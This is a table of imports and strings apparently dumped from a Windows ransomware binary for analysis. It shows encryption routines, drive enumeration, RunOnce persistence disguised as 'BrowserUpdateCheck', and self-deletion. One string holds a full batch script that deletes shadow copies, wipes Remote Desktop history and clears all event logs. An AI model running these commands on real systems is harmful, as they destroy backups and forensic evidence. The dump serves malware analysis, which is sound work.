reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x408596	0x40859d	string	0x40838e	^]_[
0x40864c	0x4087fb	string	0x4085dc	^_][
0x4086d6	0x4087fb	string	0x4085dc	^_][
0x4087db	0x4087fb	string	0x4085dc	^_][
0x4087ed	0x4087fb	string	0x4085dc	^_][
0x4087f4	0x4087fb	string	0x4085dc	^_][
0x408a17	0x408ac8	string	0x4089f5	_^][
0x408a2a	0x408ac8	string	0x4089f5	_^][
0x408a40	0x408ac8	string	0x4089f5	_^][
0x408a4e	0x408ac8	string	0x4089f5	_^][
0x408a73	0x408ac8	string	0x4089f5	_^][
0x408a88	0x408ac8	string	0x4089f5	_^][
0x408aaf	0x408ac8	string	0x4089f5	_^][
0x408ac1	0x408ac8	string	0x4089f5	_^][
0x409002	0x401048	import	0x408fe5	KERNEL32.dll.SetFilePointerEx
0x40900c	0x401038	import	0x408fe5	KERNEL32.dll.GetLastError
0x409061	0x401d98	string	0x409029	{%08lX-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}
0x40906a	0x401118	import	0x409029	USER32.dll.wsprintfA
0x409077	0x401034	import	0x409029	KERNEL32.dll.lstrlenA
0x4090e4	0x40975d	string	0x409081	UVW3
0x409119	0x4010f0	import	0x409081	RPCRT4.dll.UuidCreate
0x409151	0x40104c	import	0x409081	KERNEL32.dll.CreateFileW
0x409157	0x401040	import	0x409081	KERNEL32.dll.WriteFile
0x40916e	0x40103c	import	0x409081	KERNEL32.dll.GetFileSizeEx
0x409192	0x401034	import	0x409081	KERNEL32.dll.lstrlenA
0x409228	0x401034	import	0x409081	KERNEL32.dll.lstrlenA
0x40936f	0x401044	import	0x409081	KERNEL32.dll.ReadFile
0x40940c	0x401044	import	0x409081	KERNEL32.dll.ReadFile
0x409532	0x401034	import	0x409081	KERNEL32.dll.lstrlenA
0x409544	0x4010dc	import	0x409081	KERNEL32.dll.CloseHandle
0x4095cb	0x401034	import	0x409582	KERNEL32.dll.lstrlenA
0x4095d6	0x401034	import	0x409582	KERNEL32.dll.lstrlenA
0x4095e4	0x401034	import	0x409582	KERNEL32.dll.lstrlenA
0x4095f5	0x401034	import	0x409582	KERNEL32.dll.lstrlenA
0x4095fe	0x40107c	import	0x409582	KERNEL32.dll.lstrcmpiA
0x40967d	0x401090	import	0x409648	KERNEL32.dll.CreateProcessW
0x40969c	0x4010bc	import	0x40968a	KERNEL32.dll.MultiByteToWideChar
0x4096be	0x4010bc	import	0x40968a	KERNEL32.dll.MultiByteToWideChar
0x4096ef	0x40109c	import	0x4096cb	KERNEL32.dll.GetTempFileNameW
0x4096f5	0x4021d0	string	0x4096cb	.bat
0x409701	0x401088	import	0x4096cb	KERNEL32.dll.lstrcatW
0x40971d	0x40104c	import	0x4096cb	KERNEL32.dll.CreateFileW
0x40972e	0x402008	string	0x4096cb	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x409735	0x401034	import	0x4096cb	KERNEL32.dll.lstrlenA
0x40973e	0x401040	import	0x4096cb	KERNEL32.dll.WriteFile
0x409745	0x4010dc	import	0x4096cb	KERNEL32.dll.CloseHandle
0x409771	0x4010c0	import	0x40975d	KERNEL32.dll.WideCharToMultiByte
0x409791	0x4010c0	import	0x40975d	KERNEL32.dll.WideCharToMultiByte
0x4097dc	0x40108c	import	0x40979f	KERNEL32.dll.GetModuleFileNameW
0x4097f2	0x4021dc	string	0x40979f	COMSPEC
0x4097f7	0x401094	import	0x40979f	KERNEL32.dll.GetEnvironmentVariableW
0x409805	0x401088	import	0x40979f	KERNEL32.dll.lstrcatW
0x409811	0x4021ec	string	0x40979f	/c del
0x409829	0x4021fc	string	0x40979f	> nul
0x40985a	0x40220c	string	0x40979f	Open
0x40986a	0x4010fc	import	0x40979f	SHELL32.dll.ShellExecuteExW
0x409878	0x4010b8	import	0x40979f	KERNEL32.dll.SetPriorityClass
0x409886	0x401050	import	0x40979f	KERNEL32.dll.GetCurrentProcess
0x409892	0x40105c	import	0x40979f	KERNEL32.dll.GetCurrentThread
0x409899	0x401060	import	0x40979f	KERNEL32.dll.SetThreadPriority
0x4098bd	0x4010a4	import	0x4098b9	KERNEL32.dll.GetFileAttributesW
0x4098d9	0x401110	import	0x4098d0	SHLWAPI.dll.PathRemoveFileSpecW
0x4098df	0x401088	import	0x4098d0	KERNEL32.dll.lstrcatW
0x409912	0x40104c	import	0x4098d0	KERNEL32.dll.CreateFileW
0x40992d	0x401034	import	0x4098d0	KERNEL32.dll.lstrlenA
0x40993b	0x401040	import	0x4098d0	KERNEL32.dll.WriteFile
0x409942	0x4010dc	import	0x4098d0	KERNEL32.dll.CloseHandle
0x409981	0x40a774	string	0x4098d0	VWj\b
0x409998	0x401088	import	0x4098d0	KERNEL32.dll.lstrcatW
0x4099a0	0x401080	import	0x4098d0	KERNEL32.dll.lstrcmpiW
0x4099c1	0x4010d0	import	0x4098d0	KERNEL32.dll.lstrlenW
0x4099e9	0x4010a8	import	0x4098d0	KERNEL32.dll.FindFirstFileW
0x409a42	0x40975d	string	0x4098d0	UVW3
0x409a7c	0x40a774	string	0x4098d0	VWj\b
0x409ac5	0x40110c	import	0x4098d0	SHLWAPI.dll.PathFindFileNameW
0x409aeb	0x4010a0	import	0x4098d0	KERNEL32.dll.SetFileAttributesW
0x409b1a	0x401084	import	0x4098d0	KERNEL32.dll.lstrcpyW
0x409b42	0x4010b4	import	0x4098d0	KERNEL32.dll.MoveFileExW
0x409b66	0x4010ac	import	0x4098d0	KERNEL32.dll.FindNextFileW
0x409b6e	0x4099fa	string	0x4098d0	h "@
0x409b75	0x401078	import	0x4098d0	KERNEL32.dll.FindClose
0x409ba6	0x401030	import	0x409b9c	KERNEL32.dll.GetProcessHeap
0x409bb3	0x4010e0	import	0x409b9c	KERNEL32.dll.HeapAlloc
0x409bbb	0x40106c	import	0x409b9c	KERNEL32.dll.GetLogicalDrives
0x409bf7	0x401098	import	0x409b9c	KERNEL32.dll.GetDriveTypeA
0x409c1b	0x4010e0	import	0x409b9c	KERNEL32.dll.HeapAlloc
0x409c2e	0x4010d8	import	0x409b9c	KERNEL32.dll.lstrcpyA
0x409c57	0x401030	import	0x409b9c	KERNEL32.dll.GetProcessHeap
0x409c5e	0x4010e0	import	0x409b9c	KERNEL32.dll.HeapAlloc
0x409c8c	0x401058	import	0x409b9c	KERNEL32.dll.CreateThread
0x409ca5	0x401064	import	0x409b9c	KERNEL32.dll.WaitForMultipleObjects
0x409cd5	0x401034	import	0x409cb8	KERNEL32.dll.lstrlenA
0x409cf5	0x4010e8	import	0x409cb8	KERNEL32.dll.HeapCreate
0x409d03	0x4010e0	import	0x409cb8	KERNEL32.dll.HeapAlloc
0x409d32	0x409d1e	string	0x409cb8	h0"@
0x409d5d	0x402238	string	0x409d43	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x409d69	0x40101c	import	0x409d43	ADVAPI32.dll.RegOpenKeyExW
0x409d89	0x40229c	string	0x409d43	BrowserUpdateCheck
0x409d96	0x401000	import	0x409d43	ADVAPI32.dll.RegQueryValueExW
0x409da8	0x401080	import	0x409d43	KERNEL32.dll.lstrcmpiW
0x409dc4	0x401004	import	0x409d43	ADVAPI32.dll.RegCreateKeyExW
0x409dd5	0x4010d0	import	0x409d43	KERNEL32.dll.lstrlenW
0x409ded	0x401018	import	0x409d43	ADVAPI32.dll.RegSetValueExW
0x409df7	0x401008	import	0x409d43	ADVAPI32.dll.RegCloseKey
0x409e23	0x40104c	import	0x409e0a	KERNEL32.dll.CreateFileW
0x409e30	0x401038	import	0x409e0a	KERNEL32.dll.GetLastError
0x409e39	0x401038	import	0x409e0a	KERNEL32.dll.GetLastError
0x409e74	0x4010d8	import	0x409e0a	KERNEL32.dll.lstrcpyA
0x409e7f	0x4010e4	import	0x409e0a	KERNEL32.dll.SetFilePointer
0x409e97	0x401040	import	0x409e0a	KERNEL32.dll.WriteFile
0x409eac	0x4010dc	import	0x409e0a	KERNEL32.dll.CloseHandle
0x409f91	0x40108c	import	0x409f1b	KERNEL32.dll.GetModuleFileNameW
0x409f9e	0x401094	import	0x409f1b	KERNEL32.dll.GetEnvironmentVariableW
0x409fa4	0x4022c4	string	0x409f1b	temp
0x409fe7	0x409cb8	string	0x409f1b	SUVW
0x409ffd	0x409cb8	string	0x409f1b	SUVW
0x40a011	0x4022d0	string	0x409f1b	appdata
0x40a01e	0x401054	import	0x409f1b	KERNEL32.dll.ExitProcess
0x40a024	0x401088	import	0x409f1b	KERNEL32.dll.lstrcatW
0x40a03c	0x40110c	import	0x409f1b	SHLWAPI.dll.PathFindFileNameW
0x40a055	0x401080	import	0x409f1b	KERNEL32.dll.lstrcmpiW
0x40a079	0x4010b0	import	0x409f1b	KERNEL32.dll.CopyFileW
0x40a09d	0x4022e0	string	0x409f1b	public
0x40a0aa	0x4022f0	string	0x409f1b	ALLUSERSPROFILE
0x40a0e7	0x401084	import	0x409f1b	KERNEL32.dll.lstrcpyW
0x40a103	0x401108	import	0x409f1b	SHLWAPI.dll.PathAddBackslashW
0x40a110	0x401088	import	0x409f1b	KERNEL32.dll.lstrcatW
0x40a11a	0x409e0a	string	0x409f1b	QQSW3
0x40a12b	0x401068	import	0x409f1b	KERNEL32.dll.Sleep
0x40a171	0x402310	string	0x409f1b	{{IDENTIFIER}}
0x40a178	0x401104	import	0x409f1b	SHLWAPI.dll.StrStrA
0x40a189	0x401034	import	0x409f1b	KERNEL32.dll.lstrlenA
0x40a1ec	0x401070	import	0x409f1b	KERNEL32.dll.GetStdHandle
0x40a394	0x401034	import	0x40a343	KERNEL32.dll.lstrlenA
0x40a3be	0x401040	import	0x40a343	KERNEL32.dll.WriteFile
0x40a44d	0x402328	string	0x40a3f4	rsa_encrypt
0x40a453	0x401034	import	0x40a3f4	KERNEL32.dll.lstrlenA
0x40a571	0x402334	string	0x40a534	rsa_genkey
0x40a577	0x401034	import	0x40a534	KERNEL32.dll.lstrlenA
0x40a762	0x40267e	string	0x40a534	SUVW
0x40a7c6	0x401084	import	0x40a7a9	KERNEL32.dll.lstrcpyW
0x40a7f3	0x4010d0	import	0x40a7ee	KERNEL32.dll.lstrlenW
0x40a80e	0x401084	import	0x40a7ee	KERNEL32.dll.lstrcpyW
0x40a81a	0x4010c8	import	0x40a81a	KERNEL32.dll.CreateToolhelp32Snapshot
0x40a820	0x401074	import	0x40a820	KERNEL32.dll.Process32FirstW
0x40a826	0x401024	import	0x40a826	KERNEL32.dll.Process32NextW
0x40a82c	0x4010f8	import	0x40a82c	SHELL32.dll.SHChangeNotify
0x40a832	0x40112c	import	0x40a832	ntdll.dll._aulldiv
0x40a838	0x401128	import	0x40a838	ntdll.dll._alldiv
0x40a83e	0x401124	import	0x40a83e	ntdll.dll._allrem
0x40a844	0x401120	import	0x40a844	ntdll.dll._chkstk
0x40d2e3	0x40d358	string	0x40a844	GetFileSizeEx
0x40d350	0x40d3c4	string	0x40a844	CreateThread
0x40d35a	0x40d3a2	string	0x40a844	GetCurrentProcess
0x40d3ad	0x40d41e	string	0x40a844	GetLogicalDrives
0x40d3f5	0x40d460	string	0x40a844	lstrcmpiA
0x40d52a	0x40d572	string	0x40a844	MultiByteToWideChar
0x40d578	0x40d5ee	string	0x40a844	CryptReleaseContext
0x40d5a1	0x40d604	string	0x40a844	CryptGenRandom
0x40d5f2	0x40d646	string	0x40a844	RegQueryValueExW
0x40d700	0x40d76e	string	0x40a844	ez@I
0x40d74f	0x40d755	string	0x40a844	*.Ox
0x40d75d	0x40d714	string	0x40a844	_allrem
0x40da06	0x40d99f	string	0x40a844	:(_V
0x40e50a	0x40e4e3	string	0x40a844	q&Wj0
